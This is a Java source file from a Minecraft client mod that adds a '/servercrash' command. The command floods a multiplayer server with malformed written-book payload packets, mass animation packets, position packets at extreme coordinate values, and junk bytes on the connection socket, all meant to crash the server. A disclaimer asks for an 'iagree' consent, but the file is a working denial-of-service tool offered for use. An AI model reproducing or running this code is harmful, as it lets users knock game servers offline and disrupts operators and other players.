package com.spiritlight.invgui.commands;

import com.spiritlight.invgui.connections.ConnectionHandler;
import com.spiritlight.invgui.connections.PacketHandler;
import com.spiritlight.invgui.interfaces.annotations.AutoRegister;
import com.spiritlight.invgui.message;
import com.spiritlight.invgui.utils.PlayerUtils;
import com.spiritlight.invgui.utils.SpiritCommand;
import com.spiritlight.invgui.utils.SpiritConcurrent;
import com.spiritlight.invgui.utils.StringUtils;
import io.netty.buffer.Unpooled;
import mcp.MethodsReturnNonnullByDefault;
import net.minecraft.command.CommandException;
import net.minecraft.command.ICommandSender;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.CPacketAnimation;
import net.minecraft.network.play.client.CPacketCustomPayload;
import net.minecraft.network.play.client.CPacketPlayer;
import net.minecraft.server.MinecraftServer;
import net.minecraft.util.math.BlockPos;

import javax.annotation.ParametersAreNonnullByDefault;
import java.io.IOException;
import java.nio.charset.StandardCharsets;
import java.util.Collections;
import java.util.List;
import java.util.Locale;
import java.util.Random;

@AutoRegister(permission = 0, requirePrefix = true)
@MethodsReturnNonnullByDefault
@ParametersAreNonnullByDefault
public class CrashCommand extends SpiritCommand {
    private static final Random RANDOM = new Random();

    public static void setAgreed(boolean agreed) {
        CrashCommand.agreed = agreed;
    }

    /**
     * Modification of this field also indicates implicit consent.
     */
    private static boolean agreed = false;

    @Override
    public String getName() {
        return "servercrash";
    }

    @Override
    public String getUsage(ICommandSender sender) {
        return "/" + getName();
    }

    @Override
    public void execute(MinecraftServer server, ICommandSender sender, String[] args) throws CommandException {
        if(!agreed) {
            if(args.length != 0 && args[0].equalsIgnoreCase("iagree")) {
                message.send("You have agreed to the terms of this feature.");
                agreed = true;
                return;
            }
            message.send("[InvGui] Please note that crashing servers may have actual consequences, in real life or not.");
            message.send("If you decide to proceed, I do not hold any responsibilities for the potential damage caused.");
            message.send("In order to proceed, please run /" + getName() + " iagree to continue.");
            message.send("You are required to agree to the terms every time you join a server.");
            return;
        }
        if(args.length == 0) {
            getHelp();
            return;
        }
        int a = -1;
        try {
            a = Integer.parseInt(args[1]);
        } catch (NumberFormatException | IndexOutOfBoundsException ignored) {
        }
        switch(args[0].toLowerCase(Locale.ROOT)) {
            case "book":
                final int triesB = (a == -1 ? 2500 : a);
                SpiritConcurrent.submitAsync(() -> {
                    for(int i = 0; i< triesB; i++) {
                        sendMalformedBook();
                    }
                });
                break;
            case "packet":
                final int triesP = (a == -1 ? 10000 : a);
                SpiritConcurrent.submitAsync(() -> {
                    for(int i = 0; i< triesP; i++) {
                        PacketHandler.fire(new CPacketAnimation());
                    }
                });
                break;
            case "math":
                final BlockPos pos = sender.getPosition();
                final int triesM = (a == -1 ? 5000 : a);
                final double minX = Double.MIN_VALUE;
                final double minZ = Double.MIN_VALUE;
                final double maxX = Double.MAX_VALUE;
                final double maxZ = Double.MAX_VALUE;
                SpiritConcurrent.submitAsync(() -> {
                    final double y = PlayerUtils.getPlayer().posY;
                    for (int i = 0; i < triesM; i++) {
                        PacketHandler.fire(new CPacketPlayer.Position(
                                (i % 2 == 0 ? minX : maxX),
                                y,
                                (i % 2 == 0 ? minZ : maxZ),
                                false
                        ));
                    }
                    PlayerUtils.teleportCenter(pos);
                });
                break;
            case "handshake":
                final int triesH = (a == -1 ? 10000 : a);
                byte[] buf = {0, 0, 0};
                SpiritConcurrent.submitAsync(() -> {
                    try {
                        for(int i=0; i<triesH; i++)
                            ConnectionHandler.getSocket().getOutputStream().write(buf);
                    } catch (IOException e) {
                        e.printStackTrace();
                    }
                });
                break;
            default:
                getHelp();
        }
    }

    // Partially taken from Jigsaw Client
    private void sendMalformedBook() {
        ItemStack book = new ItemStack(Items.WRITTEN_BOOK);
        String author = PlayerUtils.getPlayer().getName();
        String title = "Wynncraft@" + StringUtils.randomString(4, true);
        String content = StringUtils.randomString(255, false);
        NBTTagCompound tag = new NBTTagCompound();
        NBTTagList list = new NBTTagList();
        for (int i = 0; i < 50; ++i) {
            NBTTagString tString = new NBTTagString(content);
            list.appendTag(tString);
        }
        tag.setString("author", author);
        tag.setString("title", title);
        tag.setTag("pages", list);
        if (book.hasTagCompound()) {
            NBTTagCompound nbttagcompound = book.getTagCompound();
            nbttagcompound.setTag("pages", list);
        } else
            book.setTagInfo("pages", list);
        String s2 = "MC|BEdit";
        if (RANDOM.nextBoolean()) {
            s2 = "MC|BSign";
        }
        book.setTagCompound(tag);
        PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
        packetbuffer.writeItemStack(book);
        PacketHandler.fire(new CPacketCustomPayload(s2, packetbuffer));
    }

    private void getHelp() {
        message.send(getName() + " [book|packet|math|handshake] [attempt] - Initiates a crash attempt");
        message.send("Default attempts are 2500, 10000, 5000, 10000");
    }

    @Override
    public List<String> getAliases() {
        return Collections.singletonList("crash");
    }
}
